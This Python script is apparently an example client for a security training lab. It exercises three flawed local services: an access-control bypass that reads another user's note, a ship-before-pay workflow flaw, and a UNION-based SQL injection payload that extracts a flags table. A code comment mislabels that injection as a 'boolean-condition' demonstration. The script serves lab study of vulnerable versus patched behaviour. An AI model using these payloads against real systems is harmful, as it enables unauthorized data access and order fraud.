#!/usr/bin/env python3
"""Example clients for the three local lab flaws. Point only at your lab."""
import argparse
import json
import urllib.parse
import urllib.request


def get(url: str, user: str = "guest") -> dict:
    req = urllib.request.Request(url, headers={"X-User": user})
    with urllib.request.urlopen(req, timeout=3) as res:
        return json.loads(res.read())


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("service", choices=("notes", "workflow", "search"))
    p.add_argument("--base", required=True, help="URL of your own lab instance")
    p.add_argument("--id", type=int, help="object ID for notes/workflow")
    args = p.parse_args()
    base = args.base.rstrip("/")
    try:
        if args.service == "notes":
            data = get(f"{base}/api/notes/{args.id or 1}", user="mallory")
            print(json.dumps(data, indent=2))
            print("Review owner/title/body; compare vulnerable and patched mode.")
        elif args.service == "workflow":
            if not args.id:
                orders = get(f"{base}/api/orders")
                args.id = next(o["id"] for o in orders["orders"] if o["item"] == "training-box")
            req = urllib.request.Request(f"{base}/api/orders/{args.id}/ship", data=b"{}", method="POST", headers={"Content-Type":"application/json", "X-User":"alice"})
            with urllib.request.urlopen(req, timeout=3) as res:
                print(res.read().decode())
            print("Compare: vulnerable mode permits ship before pay; patched mode should return 409.")
        else:
            # A harmless boolean-condition demonstration against the SQLite-backed
            # lab search endpoint. This targets only the user's own local instance.
            probe = "%' UNION SELECT flag_id,flag FROM flags -- "
            url = f"{base}/api/search?q={urllib.parse.quote(probe, safe='')}"
            print(json.dumps(get(url), indent=2))
            print("In vulnerable mode the WHERE predicate is altered; patched mode treats this as data.")
    except Exception as exc:
        print(f"Request failed: {exc}")
        return 1
    return 0

if __name__ == "__main__":
    raise SystemExit(main())
